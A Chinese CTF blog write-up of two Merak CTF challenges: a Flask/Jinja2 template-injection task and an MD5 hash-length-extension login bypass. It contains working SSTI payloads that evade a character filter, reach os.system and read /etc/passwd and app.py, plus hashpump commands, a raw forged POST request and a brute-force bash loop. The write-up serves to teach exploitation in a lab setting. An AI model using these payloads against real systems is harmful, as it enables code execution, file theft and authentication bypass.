---
title: Merak CTF平台 Writeup
categories:
  - 平台Writeup
tags:
  - ctf
  - Writeup
index_img: /img/used/prac.jpg
date: 2020-01-14 15:25:33

---

# Merak CTF

## Flask_SSTI

进去只有一个框框，根据题目提示，很明显是模板注入了。

```
{{7*7}}显示49
```

说明存在模板注入。但是接下来尝试发现英文句号，下划线和单引号都被过滤了。  

这里用到一个技巧：在模板注入的过程中，以下两种语法是等价的：

```python
{{"".__class__}}
{{""["__class__"]}}
```

这两种也是等价：  

```python
{{"".method()}}
{{""["method"]()}}
```

既然可以将对象的属性用字符串的形式索引出来，我们就可以使用字符串的一些特性绕过过滤`. ' _`这些字符的规则。  

使用ord函数，在模板注入中未成功。  

```python
""[ord(95)+ord(95)+"class"+ord(95)+ord(95)]
#失败了，报出Exception
```

考虑使用转义字符序列，发现可以成功注入。接下来就是常规的操作了。调用OS模块，发现没有回显  

```python
{{()["\x5F\x5Fclass\x5F\x5F"]["\x5F\x5Fbases\x5F\x5F"][0]["\x5F\x5Fsubclasses\x5F\x5F"]()[80]["load\x5Fmodule"]("os")["system"]("ls")}}
#返回了0，说明只传出返回值。
```

此时可考虑使用curl方式将数据带出。但我们可以在此之前，使用读取文件的函数，手机更多关于app的信息。因为没有出现file类，选用`_frozen_importlib_external.FileLoader'>`这个类中的`get_data()`方法，payload如下：

```python
{{""["\x5f\x5fclass\x5f\x5f"]["\x5F\x5Fbases\x5F\x5F"][0]["\x5F\x5Fsubclasses\x5F\x5F"]()[91]["get\x5Fdata"](0, "/etc/passwd")}}
```

成功读取到密码。尝试读取更多信息，首先要知道app的位置。使用Jinja自带的config变量查看信息，也就是：

```python
{{config}}
```

查看到如下信息。   

```
<Config {'ENV': 'production', 'DEBUG': False, ... 'APPLICATION_ROOT': '/', ... ,'MAX_COOKIE_SIZE': 4093, 'flag': 'Kn4u>H\x7fd;)F\x12\x1c$;nW\x01\x02elSH;#xwx%%\x1f\\I#X yaR \x1fI\x05'}> ~♡ⓛⓞⓥⓔ♡~
```

注意到了Application_Root和flag两个字段。flag是乱码，而应用目录显示了应用的位置，是根目录。根据flask程序的文件结构，我们知道存在一个app.py作为主程序。尝试读取这个程序：  

```python
{{""["\x5f\x5fclass\x5f\x5f"]["\x5F\x5Fbases\x5F\x5F"][0]["\x5F\x5Fsubclasses\x5F\x5F"]()[91]["get\x5Fdata"](0, "app\x2Epy")}}
```

成功读取，内容如下：

```python
import random
from flask import Flask, render_template_string, render_template, request
import os

app = Flask(__name__)
app.config['SECRET_KEY'] = 'folow @osminogka.ann on instagram =)'

def encode(line, key, key2):
 return ''.join(chr(x ^ ord(line[x]) ^ ord(key[::-1][x]) ^ ord(key2[x])) for x in range(len(line)))

file = open("/app/flag", "r")
flag = file.read()
app.config['flag'] = encode(flag, 'GQIS5EmzfZA1Ci8NslaoMxPXqrvFB7hYOkbg9y20W3tU', 'xwdFqMck1vA0pl7B8WO3DrGLma4sZ2Y6ouCPEHSQVTtU')
flag = ""
os.remove("/app/flag")
@app.route('/', methods=['GET', 'POST'])

#程序逻辑

 if '.' in p or '_' in p or '\'' in p:
 return 'Your nickname contains restricted characters!'

#程序逻辑

if __name__ == '__main__':
 app.run(
```

注意到这里确实过滤了三个符号。而前面的代码显示了flag字符串的加密方法，并且声称flag的文件被删除，所以我们根据加密方法编写解密代码如下：  

```python
def decode(newline,key,key2):
    return ''.join( chr(x ^ ord(newline[x])^ ord(key[::-1][x]) ^ ord(key2[x])) for x in range(len(newline)) )
flag_enc = 'Kn4u>\x1c~bj{\x17B@$ll\x0b\x07\x02elVK;"|t\x7f%"\x1f\x0f\x18q^%z3\x07zOI\x05'
#读取的flag加密值
flag = decode(newl, 'GQIS5EmzfZA1Ci8NslaoMxPXqrvFB7hYOkbg9y20W3tU', 'xwdFqMck1vA0pl7B8WO3DrGLma4sZ2Y6ouCPEHSQVTtU')
print(flag)
```

得到flag：`flag{fb74f76e-bce7-4dab-8e6d-51efde0a379b}`

## Cool Hash

一看就是哈希长度扩展攻击，但是缺少信息...

发现源码泄露：www.zip，解压缩得到index.php

这里截取关键逻辑

```php
<?php
        error_reporting(0);
        $secret = "********";
        setcookie("hash", md5($secret."adminadmin"));

if (isset($_POST['username']) && isset($_POST['password'])){
    $username = $_POST['username'];
    $password = $_POST['password'];
    $username = urldecode($username);
    $password = urldecode($password);
    if ($password === "admin"){
        die("u r not admin !!!");
    }

    if ($username == "admin" && $password != "admin"){
        echo("new md5:".md5($secret.$username.$password)."</br>");
        if ($_COOKIE['user'] === md5($secret.$username.$password)){
            echo("flag{this_is_a_test_flag}");
        }
    }
}
?>
```

目的是构造password != admin并且username == admin 并且哈希能够匹配。

secret从源码来看是8位，那么加上admin是13位，hashpump中输入命令

```bash
hashpump -s 70f36257301b60fb370e72366f3b3f40 -d admin -a emmm -k 13
17e465f6c8c2c3df191240b6d5e56a0d
admin\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x90\x00\x00\x00\x00\x00\x00\x00emmm
```

因为有URLDECODE，把`\x`替换成`%`，提交

```
POST /index.php HTTP/1.1
Host: 4bc07b04-4991-4557-a9ea-69de5e6dd89f.ctfp.merak.codes
...
Cookie: __cfduid=d2805811070326eab4ccd32bc5f3f70ca1575169229; hash=291b202f6f337b1e91722a49f417fb01; user=b6715a3701b5d3b0d624ea8cae54d184
Upgrade-Insecure-Requests: 1

-----------------------------1534681789211822725361541205
Content-Disposition: form-data; name="username"

admin
-----------------------------1534681789211822725361541205
Content-Disposition: form-data; name="password"

admin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%90%00%00%00%00%00%00%00emmm
-----------------------------1534681789211822725361541205
Content-Disposition: form-data; name="login"

æäº¤
-----------------------------1534681789211822725361541205--


```

发现并不正确。

考虑到secret的位数其实是未知的，实际上应该爆破一下。编写bash脚本如下：

```bash
#!/bin/bash
for var in 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20
do
hashpump -s 70f36257301b60fb370e72366f3b3f40 -d admin -a emmm -k $var | tr "\\" "x" | tr -s "xx" | tr "x" "%" 
done
```

三次tr分别：把下划线替换为x，把x去重，把x替换为%。执行后输出payload：

```bash
bash shl.sh > out.txt
cat out.txt

17e465f6c8c2c3df191240b6d5e56a0d
admin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00h%00%00%00%00%00%00%00emmm
17e465f6c8c2c3df191240b6d5e56a0d
admin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00p%00%00%00%00%00%00%00emmm
17e465f6c8c2c3df191240b6d5e56a0d
admin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00emmm
17e465f6c8c2c3df191240b6d5e56a0d
admin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%80%00%00%00%00%00%00%00emmm
17e465f6c8c2c3df191240b6d5e56a0d
...
```

发现hash值是一样的，去掉即可。把这个文件作为字典扔进BurpSuite：

![Screen Shot 2019-12-03 at 01.30.27.png](https://upload-images.jianshu.io/upload_images/19782504-ba8db383862c3155.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

得到flag：`flag{30bed9c1-a2c6-4739-aa39-018fff1491cf}`

payload是keylength = 11 时的，说明secret的位数是六位。
